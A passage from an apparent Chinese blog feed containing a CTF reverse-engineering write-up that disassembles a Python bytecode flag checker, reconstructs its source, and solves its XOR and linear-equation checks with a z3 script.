</span>BUILD_LIST               0</span><br><span class="line">          <span class="number"> 293 </span>STORE_NAME              <span class="number"> 9 </span>(x)</span><br><span class="line"></span><br><span class="line">24        <span class="number"> 296 </span>LOAD_CONST             <span class="number"> 40 </span>(5)</span><br><span class="line">          <span class="number"> 299 </span>STORE_NAME             <span class="number"> 10 </span>(k)</span><br><span class="line"></span><br><span class="line">25        <span class="number"> 302 </span>SETUP_LOOP            <span class="number"> 128 </span>(to 433)</span><br><span class="line">          <span class="number"> 305 </span>LOAD_NAME              <span class="number"> 11 </span>(range)</span><br><span class="line">          <span class="number"> 308 </span>LOAD_CONST             <span class="number"> 41 </span>(13)</span><br><span class="line">          <span class="number"> 311 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 314 </span>GET_ITER            </span><br><span class="line">       &gt;&gt; <span class="number"> 315 </span>FOR_ITER              <span class="number"> 114 </span>(to 432)</span><br><span class="line">          <span class="number"> 318 </span>STORE_NAME             <span class="number"> 12 </span>(i)</span><br><span class="line"></span><br><span class="line">26        <span class="number"> 321 </span>LOAD_NAME               <span class="number"> 8 </span>(ord)</span><br><span class="line">          <span class="number"> 324 </span>LOAD_NAME               <span class="number"> 4 </span>(str)</span><br><span class="line">          <span class="number"> 327 </span>LOAD_NAME              <span class="number"> 10 </span>(k)</span><br><span class="line">          <span class="number"> 330 </span>BINARY_SUBSCR       </span><br><span class="line">          <span class="number"> 331 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 334 </span>STORE_NAME             <span class="number"> 13 </span>(b)</span><br><span class="line"></span><br><span class="line">27        <span class="number"> 337 </span>LOAD_NAME               <span class="number"> 8 </span>(ord)</span><br><span class="line">          <span class="number"> 340 </span>LOAD_NAME               <span class="number"> 4 </span>(str)</span><br><span class="line">          <span class="number"> 343 </span>LOAD_NAME              <span class="number"> 10 </span>(k)</span><br><span class="line">          <span class="number"> 346 </span>LOAD_CONST             <span class="number"> 34 </span>(1)</span><br><span class="line">          <span class="number"> 349 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 350 </span>BINARY_SUBSCR       </span><br><span class="line">          <span class="number"> 351 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 354 </span>STORE_NAME             <span class="number"> 14 </span>(c)</span><br><span class="line"></span><br><span class="line">28        <span class="number"> 357 </span>LOAD_NAME              <span class="number"> 14 </span>(c)</span><br><span class="line">          <span class="number"> 360 </span>LOAD_NAME               <span class="number"> 0 </span>(en)</span><br><span class="line">          <span class="number"> 363 </span>LOAD_NAME              <span class="number"> 12 </span>(i)</span><br><span class="line">          <span class="number"> 366 </span>LOAD_CONST              <span class="number"> 4 </span>(6)</span><br><span class="line">          <span class="number"> 369 </span>BINARY_MODULO       </span><br><span class="line">          <span class="number"> 370 </span>BINARY_SUBSCR       </span><br><span class="line">          <span class="number"> 371 </span>BINARY_XOR          </span><br><span class="line">          <span class="number"> 372 </span>STORE_NAME             <span class="number"> 15 </span>(a11)</span><br><span class="line"></span><br><span class="line">29        <span class="number"> 375 </span>LOAD_NAME              <span class="number"> 13 </span>(b)</span><br><span class="line">          <span class="number"> 378 </span>LOAD_NAME               <span class="number"> 0 </span>(en)</span><br><span class="line">          <span class="number"> 381 </span>LOAD_NAME              <span class="number"> 12 </span>(i)</span><br><span class="line">          <span class="number"> 384 </span>LOAD_CONST              <span class="number"> 4 </span>(6)</span><br><span class="line">          <span class="number"> 387 </span>BINARY_MODULO       </span><br><span class="line">          <span class="number"> 388 </span>BINARY_SUBSCR       </span><br><span class="line">          <span class="number"> 389 </span>BINARY_XOR          </span><br><span class="line">          <span class="number"> 390 </span>STORE_NAME             <span class="number"> 16 </span>(a22)</span><br><span class="line"></span><br><span class="line">30        <span class="number"> 393 </span>LOAD_NAME               <span class="number"> 9 </span>(x)</span><br><span class="line">          <span class="number"> 396 </span>LOAD_ATTR              <span class="number"> 17 </span>(append)</span><br><span class="line">          <span class="number"> 399 </span>LOAD_NAME              <span class="number"> 15 </span>(a11)</span><br><span class="line">          <span class="number"> 402 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 405 </span>POP_TOP             </span><br><span class="line"></span><br><span class="line">31        <span class="number"> 406 </span>LOAD_NAME               <span class="number"> 9 </span>(x)</span><br><span class="line">          <span class="number"> 409 </span>LOAD_ATTR              <span class="number"> 17 </span>(append)</span><br><span class="line">          <span class="number"> 412 </span>LOAD_NAME              <span class="number"> 16 </span>(a22)</span><br><span class="line">          <span class="number"> 415 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 418 </span>POP_TOP             </span><br><span class="line"></span><br><span class="line">32        <span class="number"> 419 </span>LOAD_NAME              <span class="number"> 10 </span>(k)</span><br><span class="line">          <span class="number"> 422 </span>LOAD_CONST             <span class="number"> 35 </span>(2)</span><br><span class="line">          <span class="number"> 425 </span>INPLACE_ADD         </span><br><span class="line">          <span class="number"> 426 </span>STORE_NAME             <span class="number"> 10 </span>(k)</span><br><span class="line">          <span class="number"> 429 </span>JUMP_ABSOLUTE          315</span><br><span class="line">       &gt;&gt; <span class="number"> 432 </span>POP_BLOCK           </span><br><span class="line"></span><br><span class="line">33     &gt;&gt; <span class="number"> 433 </span>LOAD_NAME               <span class="number"> 9 </span>(x)</span><br><span class="line">          <span class="number"> 436 </span>LOAD_NAME               <span class="number"> 1 </span>(output)</span><br><span class="line">          <span class="number"> 439 </span>COMPARE_OP              <span class="number"> 2 </span>(==)</span><br><span class="line">          <span class="number"> 442 </span>POP_JUMP_IF_FALSE      453</span><br><span class="line"></span><br><span class="line">34        <span class="number"> 445 </span>LOAD_CONST             <span class="number"> 38 </span>(&#x27;good!continue\xe2\x80\xa6\xe2\x80\xa6&#x27;)</span><br><span class="line">          <span class="number"> 448 </span>PRINT_ITEM          </span><br><span class="line">          <span class="number"> 449 </span>PRINT_NEWLINE       </span><br><span class="line">          <span class="number"> 450 </span>JUMP_FORWARD           <span class="number"> 15 </span>(to 468)</span><br><span class="line"></span><br><span class="line">36     &gt;&gt; <span class="number"> 453 </span>LOAD_CONST             <span class="number"> 42 </span>(&#x27;oh,you are wrong!&#x27;)</span><br><span class="line">          <span class="number"> 456 </span>PRINT_ITEM          </span><br><span class="line">          <span class="number"> 457 </span>PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line">37        <span class="number"> 458 </span>LOAD_NAME               <span class="number"> 7 </span>(exit)</span><br><span class="line">          <span class="number"> 461 </span>LOAD_CONST             <span class="number"> 32 </span>(0)</span><br><span class="line">          <span class="number"> 464 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 467 </span>POP_TOP             </span><br><span class="line"></span><br><span class="line">39     &gt;&gt; <span class="number"> 468 </span>LOAD_NAME               <span class="number"> 5 </span>(len)</span><br><span class="line">          <span class="number"> 471 </span>LOAD_NAME               <span class="number"> 4 </span>(str)</span><br><span class="line">          <span class="number"> 474 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 477 </span>STORE_NAME             <span class="number"> 18 </span>(l)</span><br><span class="line"></span><br><span class="line">40        <span class="number"> 480 </span>LOAD_NAME               <span class="number"> 8 </span>(ord)</span><br><span class="line">          <span class="number"> 483 </span>LOAD_NAME               <span class="number"> 4 </span>(str)</span><br><span class="line">          <span class="number"> 486 </span>LOAD_NAME              <span class="number"> 18 </span>(l)</span><br><span class="line">          <span class="number"> 489 </span>LOAD_CONST             <span class="number"> 43 </span>(7)</span><br><span class="line">          <span class="number"> 492 </span>BINARY_SUBTRACT     </span><br><span class="line">          <span class="number"> 493 </span>BINARY_SUBSCR       </span><br><span class="line">          <span class="number"> 494 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 497 </span>STORE_NAME             <span class="number"> 19 </span>(a1)</span><br><span class="line"></span><br><span class="line">41        <span class="number"> 500 </span>LOAD_NAME               <span class="number"> 8 </span>(ord)</span><br><span class="line">          <span class="number"> 503 </span>LOAD_NAME               <span class="number"> 4 </span>(str)</span><br><span class="line">          <span class="number"> 506 </span>LOAD_NAME              <span class="number"> 18 </span>(l)</span><br><span class="line">          <span class="number"> 509 </span>LOAD_CONST              <span class="number"> 4 </span>(6)</span><br><span class="line">          <span class="number"> 512 </span>BINARY_SUBTRACT     </span><br><span class="line">          <span class="number"> 513 </span>BINARY_SUBSCR       </span><br><span class="line">          <span class="number"> 514 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 517 </span>STORE_NAME             <span class="number"> 20 </span>(a2)</span><br><span class="line"></span><br><span class="line">42        <span class="number"> 520 </span>LOAD_NAME               <span class="number"> 8 </span>(ord)</span><br><span class="line">          <span class="number"> 523 </span>LOAD_NAME               <span class="number"> 4 </span>(str)</span><br><span class="line">          <span class="number"> 526 </span>LOAD_NAME              <span class="number"> 18 </span>(l)</span><br><span class="line">          <span class="number"> 529 </span>LOAD_CONST             <span class="number"> 40 </span>(5)</span><br><span class="line">          <span class="number"> 532 </span>BINARY_SUBTRACT     </span><br><span class="line">          <span class="number"> 533 </span>BINARY_SUBSCR       </span><br><span class="line">          <span class="number"> 534 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 537 </span>STORE_NAME             <span class="number"> 21 </span>(a3)</span><br><span class="line"></span><br><span class="line">43        <span class="number"> 540 </span>LOAD_NAME               <span class="number"> 8 </span>(ord)</span><br><span class="line">          <span class="number"> 543 </span>LOAD_NAME               <span class="number"> 4 </span>(str)</span><br><span class="line">          <span class="number"> 546 </span>LOAD_NAME              <span class="number"> 18 </span>(l)</span><br><span class="line">          <span class="number"> 549 </span>LOAD_CONST             <span class="number"> 36 </span>(4)</span><br><span class="line">          <span class="number"> 552 </span>BINARY_SUBTRACT     </span><br><span class="line">          <span class="number"> 553 </span>BINARY_SUBSCR       </span><br><span class="line">          <span class="number"> 554 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 557 </span>STORE_NAME             <span class="number"> 22 </span>(a4)</span><br><span class="line"></span><br><span class="line">44        <span class="number"> 560 </span>LOAD_NAME               <span class="number"> 8 </span>(ord)</span><br><span class="line">          <span class="number"> 563 </span>LOAD_NAME               <span class="number"> 4 </span>(str)</span><br><span class="line">          <span class="number"> 566 </span>LOAD_NAME              <span class="number"> 18 </span>(l)</span><br><span class="line">          <span class="number"> 569 </span>LOAD_CONST              <span class="number"> 0 </span>(3)</span><br><span class="line">          <span class="number"> 572 </span>BINARY_SUBTRACT     </span><br><span class="line">          <span class="number"> 573 </span>BINARY_SUBSCR       </span><br><span class="line">          <span class="number"> 574 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 577 </span>STORE_NAME             <span class="number"> 23 </span>(a5)</span><br><span class="line"></span><br><span class="line">45        <span class="number"> 580 </span>LOAD_NAME               <span class="number"> 8 </span>(ord)</span><br><span class="line">          <span class="number"> 583 </span>LOAD_NAME               <span class="number"> 4 </span>(str)</span><br><span class="line">          <span class="number"> 586 </span>LOAD_NAME              <span class="number"> 18 </span>(l)</span><br><span class="line">          <span class="number"> 589 </span>LOAD_CONST             <span class="number"> 35 </span>(2)</span><br><span class="line">          <span class="number"> 592 </span>BINARY_SUBTRACT     </span><br><span class="line">          <span class="number"> 593 </span>BINARY_SUBSCR       </span><br><span class="line">          <span class="number"> 594 </span>CALL_FUNCTION            1</span><br><span class="line">          <span class="number"> 597 </span>STORE_NAME             <span class="number"> 24 </span>(a6)</span><br><span class="line"></span><br><span class="line">46        <span class="number"> 600 </span>LOAD_NAME              <span class="number"> 19 </span>(a1)</span><br><span class="line">          <span class="number"> 603 </span>LOAD_CONST              <span class="number"> 0 </span>(3)</span><br><span class="line">          <span class="number"> 606 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 607 </span>LOAD_NAME              <span class="number"> 20 </span>(a2)</span><br><span class="line">          <span class="number"> 610 </span>LOAD_CONST             <span class="number"> 35 </span>(2)</span><br><span class="line">          <span class="number"> 613 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 614 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 615 </span>LOAD_NAME              <span class="number"> 21 </span>(a3)</span><br><span class="line">          <span class="number"> 618 </span>LOAD_CONST             <span class="number"> 40 </span>(5)</span><br><span class="line">          <span class="number"> 621 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 622 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 623 </span>LOAD_CONST             <span class="number"> 44 </span>(1003)</span><br><span class="line">          <span class="number"> 626 </span>COMPARE_OP              <span class="number"> 2 </span>(==)</span><br><span class="line">          <span class="number"> 629 </span>POP_JUMP_IF_FALSE      807</span><br><span class="line"></span><br><span class="line">47        <span class="number"> 632 </span>LOAD_NAME              <span class="number"> 19 </span>(a1)</span><br><span class="line">          <span class="number"> 635 </span>LOAD_CONST             <span class="number"> 36 </span>(4)</span><br><span class="line">          <span class="number"> 638 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 639 </span>LOAD_NAME              <span class="number"> 20 </span>(a2)</span><br><span class="line">          <span class="number"> 642 </span>LOAD_CONST             <span class="number"> 43 </span>(7)</span><br><span class="line">          <span class="number"> 645 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 646 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 647 </span>LOAD_NAME              <span class="number"> 21 </span>(a3)</span><br><span class="line">          <span class="number"> 650 </span>LOAD_CONST              <span class="number"> 3 </span>(9)</span><br><span class="line">          <span class="number"> 653 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 654 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 655 </span>LOAD_CONST             <span class="number"> 45 </span>(2013)</span><br><span class="line">          <span class="number"> 658 </span>COMPARE_OP              <span class="number"> 2 </span>(==)</span><br><span class="line">          <span class="number"> 661 </span>POP_JUMP_IF_FALSE      807</span><br><span class="line"></span><br><span class="line">48        <span class="number"> 664 </span>LOAD_NAME              <span class="number"> 19 </span>(a1)</span><br><span class="line">          <span class="number"> 667 </span>LOAD_NAME              <span class="number"> 20 </span>(a2)</span><br><span class="line">          <span class="number"> 670 </span>LOAD_CONST             <span class="number"> 46 </span>(8)</span><br><span class="line">          <span class="number"> 673 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 674 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 675 </span>LOAD_NAME              <span class="number"> 21 </span>(a3)</span><br><span class="line">          <span class="number"> 678 </span>LOAD_CONST             <span class="number"> 35 </span>(2)</span><br><span class="line">          <span class="number"> 681 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 682 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 683 </span>LOAD_CONST             <span class="number"> 47 </span>(1109)</span><br><span class="line">          <span class="number"> 686 </span>COMPARE_OP              <span class="number"> 2 </span>(==)</span><br><span class="line">          <span class="number"> 689 </span>POP_JUMP_IF_FALSE      804</span><br><span class="line"></span><br><span class="line">49        <span class="number"> 692 </span>LOAD_NAME              <span class="number"> 22 </span>(a4)</span><br><span class="line">          <span class="number"> 695 </span>LOAD_CONST              <span class="number"> 0 </span>(3)</span><br><span class="line">          <span class="number"> 698 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 699 </span>LOAD_NAME              <span class="number"> 23 </span>(a5)</span><br><span class="line">          <span class="number"> 702 </span>LOAD_CONST             <span class="number"> 35 </span>(2)</span><br><span class="line">          <span class="number"> 705 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 706 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 707 </span>LOAD_NAME              <span class="number"> 24 </span>(a6)</span><br><span class="line">          <span class="number"> 710 </span>LOAD_CONST             <span class="number"> 40 </span>(5)</span><br><span class="line">          <span class="number"> 713 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 714 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 715 </span>LOAD_CONST             <span class="number"> 48 </span>(671)</span><br><span class="line">          <span class="number"> 718 </span>COMPARE_OP              <span class="number"> 2 </span>(==)</span><br><span class="line">          <span class="number"> 721 </span>POP_JUMP_IF_FALSE      801</span><br><span class="line"></span><br><span class="line">50        <span class="number"> 724 </span>LOAD_NAME              <span class="number"> 22 </span>(a4)</span><br><span class="line">          <span class="number"> 727 </span>LOAD_CONST             <span class="number"> 36 </span>(4)</span><br><span class="line">          <span class="number"> 730 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 731 </span>LOAD_NAME              <span class="number"> 23 </span>(a5)</span><br><span class="line">          <span class="number"> 734 </span>LOAD_CONST             <span class="number"> 43 </span>(7)</span><br><span class="line">          <span class="number"> 737 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 738 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 739 </span>LOAD_NAME              <span class="number"> 24 </span>(a6)</span><br><span class="line">          <span class="number"> 742 </span>LOAD_CONST              <span class="number"> 3 </span>(9)</span><br><span class="line">          <span class="number"> 745 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 746 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 747 </span>LOAD_CONST             <span class="number"> 49 </span>(1252)</span><br><span class="line">          <span class="number"> 750 </span>COMPARE_OP              <span class="number"> 2 </span>(==)</span><br><span class="line">          <span class="number"> 753 </span>POP_JUMP_IF_FALSE      798</span><br><span class="line"></span><br><span class="line">51        <span class="number"> 756 </span>LOAD_NAME              <span class="number"> 22 </span>(a4)</span><br><span class="line">          <span class="number"> 759 </span>LOAD_NAME              <span class="number"> 23 </span>(a5)</span><br><span class="line">          <span class="number"> 762 </span>LOAD_CONST             <span class="number"> 46 </span>(8)</span><br><span class="line">          <span class="number"> 765 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 766 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 767 </span>LOAD_NAME              <span class="number"> 24 </span>(a6)</span><br><span class="line">          <span class="number"> 770 </span>LOAD_CONST             <span class="number"> 35 </span>(2)</span><br><span class="line">          <span class="number"> 773 </span>BINARY_MULTIPLY     </span><br><span class="line">          <span class="number"> 774 </span>BINARY_ADD          </span><br><span class="line">          <span class="number"> 775 </span>LOAD_CONST             <span class="number"> 50 </span>(644)</span><br><span class="line">          <span class="number"> 778 </span>COMPARE_OP              <span class="number"> 2 </span>(==)</span><br><span class="line">          <span class="number"> 781 </span>POP_JUMP_IF_FALSE      795</span><br><span class="line"></span><br><span class="line">52        <span class="number"> 784 </span>LOAD_CONST             <span class="number"> 51 </span>(&#x27;congraduation!you get the right flag!&#x27;)</span><br><span class="line">          <span class="number"> 787 </span>PRINT_ITEM          </span><br><span class="line">          <span class="number"> 788 </span>PRINT_NEWLINE       </span><br><span class="line">          <span class="number"> 789 </span>JUMP_ABSOLUTE          795</span><br><span class="line">          <span class="number"> 792 </span>JUMP_ABSOLUTE          798</span><br><span class="line">       &gt;&gt; <span class="number"> 795 </span>JUMP_ABSOLUTE          801</span><br><span class="line">       &gt;&gt; <span class="number"> 798 </span>JUMP_ABSOLUTE          804</span><br><span class="line">       &gt;&gt; <span class="number"> 801 </span>JUMP_ABSOLUTE          807</span><br><span class="line">       &gt;&gt; <span class="number"> 804 </span>JUMP_FORWARD            <span class="number"> 0 </span>(to 807)</span><br><span class="line">       &gt;&gt; <span class="number"> 807 </span>LOAD_CONST             <span class="number"> 52 </span>(None)</span><br><span class="line">          <span class="number"> 810 </span>RETURN_VALUE </span><br></pre></td></tr></table></figure><p>BUILD_LIST`(<em>count</em>)</p><p>类似于 <a href="https://docs.python.org/zh-cn/3.7/library/dis.html#opcode-BUILD_TUPLE"><code>BUILD_TUPLE</code></a> 但会创建一个列表。</p><p>需要一个个在官方文档里面找，过程复杂,结果如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">en = [<span class="number">3</span>,<span class="number">37</span>,<span class="number">72</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">132</span>]</span><br><span class="line">output = [<span class="number">101</span>,<span class="number">96</span>,<span class="number">23</span>,<span class="number">68</span>,<span class="number">112</span>,<span class="number">42</span>,<span class="number">107</span>,<span class="number">62</span>,<span class="number">96</span>,<span class="number">53</span>,<span class="number">176</span>,<span class="number">179</span>,<span class="number">98</span>,<span class="number">53</span>,<span class="number">67</span>,<span class="number">29</span>,<span class="number">41</span>,<span class="number">120</span>,<span class="number">60</span>,<span class="number">106</span>,<span class="number">51</span>,<span class="number">101</span>,<span class="number">178</span>,<span class="number">189</span>,<span class="number">101</span>,<span class="number">48</span>]</span><br><span class="line">flag = raw_input(<span class="string">&#x27;please input your flag:&#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = flag</span><br><span class="line">a = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="keyword">if</span> a&gt;=<span class="number">38</span>:</span><br><span class="line">    print(<span class="string">&#x27;lenth wrong!&#x27;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span>((((<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">1</span>])+<span class="number">2020</span>*<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">0</span>]))*<span class="number">2020</span>+<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">2</span>]))*<span class="number">2020</span>+<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">3</span>]))*<span class="number">2020</span>+<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">4</span>])!=<span class="number">1182843538814603</span>):</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">x=[]</span><br><span class="line">k=<span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">   b=<span class="built_in">ord</span>(<span class="built_in">str</span>[k])</span><br><span class="line">   c=<span class="built_in">ord</span>(<span class="built_in">str</span>[k+<span class="number">1</span>])</span><br><span class="line">   a11=c^en[i%<span class="number">6</span>]</span><br><span class="line">   a22=b^en[i%<span class="number">6</span>]</span><br><span class="line">   x.append(a11)</span><br><span class="line">   x.append(a22)</span><br><span class="line">   k+=<span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> x!=output:</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">l=<span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">a1=<span class="built_in">ord</span>(<span class="built_in">str</span>[l-<span class="number">7</span>])</span><br><span class="line">a2=<span class="built_in">ord</span>(<span class="built_in">str</span>[l-<span class="number">6</span>])</span><br><span class="line">a3=<span class="built_in">ord</span>(<span class="built_in">str</span>[l-<span class="number">5</span>])</span><br><span class="line">a4=<span class="built_in">ord</span>(<span class="built_in">str</span>[l-<span class="number">4</span>])</span><br><span class="line">a5=<span class="built_in">ord</span>(<span class="built_in">str</span>[l-<span class="number">3</span>])</span><br><span class="line">a6=<span class="built_in">ord</span>(<span class="built_in">str</span>[l-<span class="number">2</span>])</span><br><span class="line"><span class="keyword">if</span>(a1*<span class="number">3</span>+a2*<span class="number">2</span>+a3*<span class="number">5</span>==<span class="number">1003</span>):</span><br><span class="line">   <span class="keyword">if</span>(a1*<span class="number">4</span>+a2*<span class="number">7</span>+a3*<span class="number">9</span>==<span class="number">2013</span>):</span><br><span class="line">      <span class="keyword">if</span>(a1+a2*<span class="number">8</span>+a3*<span class="number">2</span>==<span class="number">1109</span>):</span><br><span class="line">         <span class="keyword">if</span>(a4*<span class="number">3</span>+a5*<span class="number">2</span>+a6*<span class="number">5</span>==<span class="number">671</span>):</span><br><span class="line">            <span class="keyword">if</span>(a4*<span class="number">4</span>+a5*<span class="number">7</span>+a6*<span class="number">9</span>==<span class="number">1252</span>):</span><br><span class="line">               <span class="keyword">if</span>(a4+a5*<span class="number">8</span>+a6*<span class="number">2</span>==<span class="number">644</span>):</span><br><span class="line">                  print(<span class="string">&#x27;congraduation!you get the right flag!&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是验证运算，利用z3库求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a1=Real(<span class="string">&#x27;a1&#x27;</span>)</span><br><span class="line">a2=Real(<span class="string">&#x27;a2&#x27;</span>)</span><br><span class="line">a3=Real(<span class="string">&#x27;a3&#x27;</span>)</span><br><span class="line">a4=Real(<span class="string">&#x27;a4&#x27;</span>)</span><br><span class="line">a5=Real(<span class="string">&#x27;a5&#x27;</span>)</span><br><span class="line">a6=Real(<span class="string">&#x27;a6&#x27;</span>)</span><br><span class="line">s=Solver()</span><br><span class="line">s.add(a1*<span class="number">3</span>+a2*<span class="number">2</span>+a3*<span class="number">5</span>==<span class="number">1003</span>)</span><br><span class="line">s.add(a1*<span class="number">4</span>+a2*<span class="number">7</span>+a3*<span class="number">9</span>==<span class="number">2013</span>)</span><br><span class="line">s.add(a1+a2*<span class="number">8</span>+a3*<span class="number">2</span>==<span class="number">1109</span>)</span><br><span class="line">s.add(a4*<span class="number">3</span>+a5*<span class="number">2</span>+a6*<span class="number">5</span>==<span class="number">671</span>)</span><br><span class="line">s.add(a4*<span class="number">4</span>+a5*<span class="number">7</span>+a6*<span class="number">9</span>==<span class="number">1252</span>)</span><br><span class="line">s.add(a4+a5*<span class="number">8</span>+a6*<span class="number">2</span>==<span class="number">644</span>)</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">result=s.model()</span><br><span class="line"><span class="comment">#print(result)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[a4 = 102, a2 = 101, a6 = 51, a1 = 97, a5 = 55, a3 = 102</span></span><br><span class="line">en = [<span class="number">3</span>,<span class="number">37</span>,<span class="number">72</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">132</span>]</span><br><span class="line">output = [<span class="number">101</span>,<span class="number">96</span>,<span class="number">23</span>,<span class="number">68</span>,<span class="number">112</span>,<span class="number">42</span>,<span class="number">107</span>,<span class="number">62</span>,<span class="number">96</span>,<span class="number">53</span>,<span class="number">176</span>,<span class="number">179</span>,<span class="number">98</span>,<span class="number">53</span>,<span class="number">67</span>,<span class="number">29</span>,<span class="number">41</span>,<span class="number">120</span>,<span class="number">60</span>,<span class="number">106</span>,<span class="number">51</span>,<span class="number">101</span>,<span class="number">178</span>,<span class="number">189</span>,<span class="number">101</span>,<span class="number">48</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">flag+=<span class="built_in">chr</span>(output[k+<span class="number">1</span>]^en[i%<span class="number">6</span>])</span><br><span class="line">flag+=<span class="built_in">chr</span>(output[k]^en[i%<span class="number">6</span>])</span><br><span class="line">k+=<span class="number">2</span></span><br><span class="line">print(<span class="string">&#x27;flag&#123;&#x27;</span>+flag+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">102</span>)+<span class="built_in">chr</span>(<span class="number">102</span>)+<span class="built_in">chr</span>(<span class="number">55</span>)+<span class="built_in">chr</span>(<span class="number">51</span>)+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2021/09/14/bytecode/%E6%8D%95%E8%8E%B7.PNG" alt="捕获"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;羊城杯-2020-Bytecode&quot;&gt;&lt;a href=&quot;#羊城杯-2020-Bytecode&quot; class=&quot;headerlink&quot; title=&quot;[羊城杯 2020]Bytecode&quot;&gt;&lt;/a&gt;[羊城杯 2020]Bytecode&lt;/h1&gt;&lt;p&gt;看到题目是Byt</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>DASCTF八月-RE</title>
    <link href="http://example.com/2021/09/04/bayue/"/>
    <id>http://example.com/2021/09/04/bayue/</id>
    <published>2021-09-04T08:06:11.000Z</published>
    <updated>2021-09-04T08:24:37.452Z</updated>
    
